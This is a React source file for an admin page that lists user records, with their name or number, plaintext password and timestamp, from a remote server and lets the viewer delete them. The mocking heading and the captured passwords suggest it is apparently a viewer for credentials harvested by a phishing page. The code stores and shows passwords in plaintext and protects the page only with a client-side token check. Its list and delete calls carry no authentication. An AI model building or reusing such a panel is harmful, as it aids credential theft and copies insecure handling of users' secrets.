
import './Admin.css'
import React, { useEffect, useState } from 'react';
import 'datatables.net';
import { useNavigate } from 'react-router-dom';


const Admins = () => {
 
  const navigate = useNavigate()
  const [users,setUsers] = useState();
 


  const handleDelete = (id)=>{
    // console.log(id);
    fetch(`https://phs-server-1.onrender.com/user/${id}`,{
      method: 'DELETE'
    })

    .then(res => res.json())
    .then(data => {
      // console.log(data)
      
    })
  }
 

 
  useEffect(() => {
    fetch('https://phs-server-1.onrender.com/user',)
    .then(res => res.json())
    .then(data =>{
      setUsers(data)
    })

    { !localStorage.getItem('PH-ADMIN-TOKEN') &&  navigate('/') }

 
  }, [users]);
  return (
    <div className='table'>
      <div id="wrapper">
        <h1>user Are Crying🥲</h1>
        <h1>Total user - {users?.length} </h1>

        <table id="keywords"   cellspacing="0" cellpadding="0">
          <thead>
            <tr>
              <th><span>user</span></th>
              <th><span>Number</span></th>
              <th><span>Password</span></th>
              <th><span>time</span></th>
              <th><span>Action</span></th>
            </tr>
          </thead>
          <tbody>
           {
            users?.reverse().map((user,i) =>
              <tr key={user._id}>
              <td class="lalign">user-{i+1}</td>
              <td>{user.name}</td>
              <td>{user.pass}</td>
              <td>{user.time}</td>
              <td onClick={() => handleDelete(user._id)}>Delete</td>
            </tr>)
           }
          </tbody>
        </table>
      </div>

    </div>
  );
};

export default Admins;